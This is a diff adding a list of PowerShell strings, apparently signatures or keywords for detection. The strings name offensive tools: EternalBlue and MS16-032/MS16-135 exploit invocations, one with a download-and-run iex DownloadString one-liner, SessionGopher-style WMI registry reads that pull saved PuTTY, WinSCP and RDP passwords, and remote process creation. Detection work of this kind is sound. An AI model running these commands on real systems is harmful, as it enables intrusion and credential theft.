@@ -1,0 +1,27 @@
+"Invoke-EternalBlue -Target 127.0.0.1  -InitialGrooms 12 -MaxAttempts 12 -Shellcode @(0x90,0x90,0xC3)"
+"Invoke-EternalBlue($Target, $InitialGrooms, $MaxAttempts, $Shellcode){"
+"Invoke-MS16-032 -Command ""iex(New-Object Net.WebClient).DownloadString('http://google.com')"""
+"Invoke-MS16032 -Command \"" $+ $oneliner $+ \"""");"
+"Invoke-MS16032.ps1""));"
+"Invoke-MS16135 -Command ""iex(New-Object Net.WebClient).DownloadString('http://google.com')"""
+"Invoke-MS16135 -Command \"" $+ $oneliner $+ \"""");"
+"Invoke-MS16135.ps1"");"
+"Invoke-SessionGopher -Thorough"");"
+"Invoke-WmiMethod -Class 'StdRegProv' -Name 'EnumKey' -ArgumentList $HKU,'' -ComputerName $RemoteComputer @optionalCreds | Select-Object -ExpandProperty sNames | Where-Object {$_ -match 'S-1-5-21-[\d\-]+$'}"
+"Invoke-WmiMethod -ComputerName $RemoteComputer -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $HKLM,$SIDPath,$Value @optionalCreds).sValue"
+"Invoke-WmiMethod -ComputerName $RemoteComputer -Class 'StdRegProv' -Name EnumKey -ArgumentList $HKU,$PuTTYPath @optionalCreds"
+"Invoke-WmiMethod -ComputerName $RemoteComputer -Class 'StdRegProv' -Name EnumKey -ArgumentList $HKU,$RDPPath @optionalCreds"
+"Invoke-WmiMethod -ComputerName $RemoteComputer -Class 'StdRegProv' -Name EnumKey -ArgumentList $HKU,$WinSCPPath @optionalCreds"
+"Invoke-WmiMethod -ComputerName $RemoteComputer -Class 'StdRegProv' -Name GetDWordValue -ArgumentList $HKU,$MasterPassPath,""UseMasterPassword"" @optionalCreds).uValue"
+"Invoke-WmiMethod -ComputerName $RemoteComputer -Class 'StdRegProv' -Name GetStringValue -ArgumentList $HKU,$Location,""HostName"" @optionalCreds).sValue"
+"Invoke-WmiMethod -ComputerName $RemoteComputer -Class 'StdRegProv' -Name GetStringValue -ArgumentList $HKU,$Location,""Password"" @optionalCreds).sValue"
+"Invoke-WmiMethod -ComputerName $RemoteComputer -Class 'StdRegProv' -Name GetStringValue -ArgumentList $HKU,$Location,""UserName"" @optionalCreds).sValue"
+"Invoke-WmiMethod -ComputerName $RemoteComputer -Class 'StdRegProv' -Name GetStringValue -ArgumentList $HKU,$Location,""UserNameHint"" @optionalCreds).sValue"
+"Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $reghive, $regpath, $registrydownname -ComputerName $RemoteComputer @optionalCreds"
+"Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $HKLM, $regpath, $registrydownname -Computer $RemoteComputer @optionalCreds"
+Invoke-MS16-032.ps1
+Invoke-MS16032 {
+Invoke-MS16135 {
+Invoke-SessionGopher
+Invoke-SessionGopher {
+Invoke-WmiMethod -class win32_process -Name Create -Argumentlist $remote_command -ComputerName $RemoteComputer @optionalCreds
